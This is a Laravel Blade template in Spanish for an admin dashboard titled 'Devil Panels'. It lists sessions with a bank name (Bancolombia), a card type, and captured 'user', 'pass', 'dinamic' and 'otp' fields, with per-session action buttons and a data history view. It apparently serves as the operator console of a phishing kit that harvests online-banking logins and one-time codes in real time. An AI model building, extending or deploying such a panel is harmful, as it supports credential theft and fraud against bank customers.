@extends('admin.layouts.app')

@section('title', 'Dashboard')
@section('header_title', 'Devil Panels')
@section('page_id', 'dashboard')

@section('content')
  {{-- Pasar mapa de proyectos al JavaScript --}}
  <script>
    window.PROJECTS_MAP = @json($projectsMap ?? []);
  </script>

  <div class="wrap">
    <div class="card">
      <div class="cardHeader">
        <h2>Registros</h2>
        <!-- <div class="search">
          <span style="opacity:.7;font-size:12px;">🔎</span>
          <input id="q" placeholder="Buscar por id/user/estado..." />
        </div> -->
      </div>
      <div class="cardBody">
        {{-- Skeleton Loading --}}
        <div id="sessionsSkeleton" class="loading">
          @for($i = 0; $i < 5; $i++)
          <div class="skeleton-session">
            <div class="skeleton-session-top">
              <div class="skeleton-session-left">
                <div class="skeleton skeleton-session-dot"></div>
                <div class="skeleton skeleton-session-id"></div>
              </div>
              <div class="skeleton skeleton-session-action"></div>
            </div>
            <div class="skeleton-session-bottom">
              <div class="skeleton skeleton-session-bank"></div>
              <div class="skeleton-session-meta">
                <div class="skeleton skeleton-session-meta-item"></div>
                <div class="skeleton skeleton-session-meta-item"></div>
                <div class="skeleton skeleton-session-meta-item"></div>
                <div class="skeleton skeleton-session-meta-item"></div>
                <div class="skeleton skeleton-session-meta-item"></div>
              </div>
            </div>
          </div>
          @endfor
        </div>
        {{-- Sessions List --}}
        <div id="sessionsList" class="loading"></div>

        {{-- Pagination --}}
        <div id="sessionsPagination" class="pagination-wrapper" style="display: none;">
          <div class="pagination-controls">
            <div class="pagination-per-page">
              <label for="sessionsPerPage">Mostrar:</label>
              <select id="sessionsPerPage" class="pagination-select">
                <option value="10">10</option>
                <option value="15" selected>15</option>
                <option value="25">25</option>
                <option value="50">50</option>
              </select>
              <span>por página</span>
            </div>
            <div class="pagination-info" id="paginationInfo"></div>
          </div>
          <nav class="pagination" aria-label="Paginacion">
            <button class="pagination-btn" id="firstPage" aria-label="Primera página">
              <i class="fas fa-angle-double-left"></i>
            </button>
            <button class="pagination-btn" id="prevPage" aria-label="Anterior">
              <i class="fas fa-chevron-left"></i>
            </button>
            <div class="pagination-pages" id="paginationPages"></div>
            <button class="pagination-btn" id="nextPage" aria-label="Siguiente">
              <i class="fas fa-chevron-right"></i>
            </button>
            <button class="pagination-btn" id="lastPage" aria-label="Última página">
              <i class="fas fa-angle-double-right"></i>
            </button>
          </nav>
        </div>
      </div>
    </div>

    <div class="card detailCardDesktop">
      <div class="cardHeader">
        <h2>Detalle</h2>
        <div class="pill"><b>Session:</b>&nbsp;<span id="selectedId">—</span></div>
      </div>

      <div class="detailCardBody">
        {{-- Top info bar --}}
        <div class="detailInfoBar" id="detailInfoBar">
          <div class="detailInfoLeft">
            <span class="dot" id="detailStateDot"></span>
            <span class="detailStateText" id="detailStateText">—</span>
          </div>
          <div class="detailInfoRight">
            <div class="pill" id="detailBankPill">—</div>
            <div class="pill" id="detailTypePill">—</div>
            <div id="detailActionPill" class="pill">—</div>
          </div>
        </div>

        {{-- Actions --}}
        <div class="actions" id="actions"></div>

        {{-- Content sections (like modal) --}}
        <div class="detailContent" id="detailContent">
          <div class="detailPlaceholder">
            <span>Selecciona una sesión para ver los detalles</span>
          </div>
        </div>

        {{-- Focus section --}}
        <h4 class="content-label" id="detailFocusLabel" style="display:none;">Datos Actuales</h4>
        <div id="detailFocus"></div>

        {{-- History section --}}
        <h4 class="content-label" id="detailHistoryLabel" style="display:none;">Historial de Datos</h4>
        <div id="detailHistory"></div>
      </div>
    </div>
  </div>

  {{-- Modal mobile (igual que ya lo tienes) --}}
  <div class="modalOverlay" id="modalOverlay" aria-hidden="true">
    <div class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
      <div class="modalHeader">
        <div class="title" id="modalTitle">
          <span id="modalState"></span>
          <span class="mid" id="modalSessionId">—</span>
        </div>
        <button class="iconBtn" id="closeModalBtn" aria-label="Cerrar">✕</button>
      </div>

      <div class="modalBody">
        <div class="modalBodyFlex">
          <div class="modalBodyLeft">
            <div class="pill" id="modalBankPill">Bancolombia</div>
            <div class="pill" id="modalCcPill">Classic Debit</div>
          </div>
          <div class="modalBodyRight" id="modalActionPill">OTP</div>
        </div>
        <div id="modalcontent">
          <!-- CONTENIDO -->
           <h4 class="content-label">Nuevos Datos</h4>
          <div id="modalFocus"></div>
            <h4 class="content-label">Historial de Datos</h4>
          <div id="modalHistory"></div>
          <!-- HISTORIAL -->
        </div>
      </div>
      <div class="modalActions" id="modalActions"> <!-- BOTONES --></div>
    </div>
  </div>

  {{-- Templates del dashboard (para no tener HTML en JS) --}}
  <!-- ===== Templates ===== -->
  <template id="tpl-session-row">
    <div class="row">
      <!-- TOP -->
      <div class="rowTop">
        <div class="topLeft">
          <span class="dot" data-part="stateDot"></span>
          <span class="sid" data-part="sid"></span>
        </div>

        <div class="pill actionPill" data-field="action"></div>
      </div>

      <!-- BOTTOM -->
      <div class="rowBottom">
        <div class="bankPill" data-field="bank"></div>

        <div class="metaRight">
          <span class="kv"><b>user</b> <span data-field="user"></span></span>
          <span class="kv"><b>pass</b> <span data-field="pass"></span></span>
          <span class="kv"><b>dinamic</b> <span data-field="dinamic"></span></span>
          <span class="kv"><b>otp</b> <span data-field="otp"></span></span>
        </div>
      </div>
    </div>
  </template>

  <template id="tpl-action-btn">
    <button type="button"></button>
  </template>

  <template id="tpl-action-info">
    <span class="mutedInfo"></span>
  </template>

  <template id="tpl-detail-top">
    <span class="detailLeft" style="display:inline-flex;align-items:center;gap:10px;">
      <span class="dot"></span>
      <span>Estado: <b class="detailState" style="color:rgba(255,255,255,.92)"></b></span>
    </span>
    <span>Acción: <b class="detailAction" style="color:rgba(255,255,255,.92)"></b></span>
  </template>
@endsection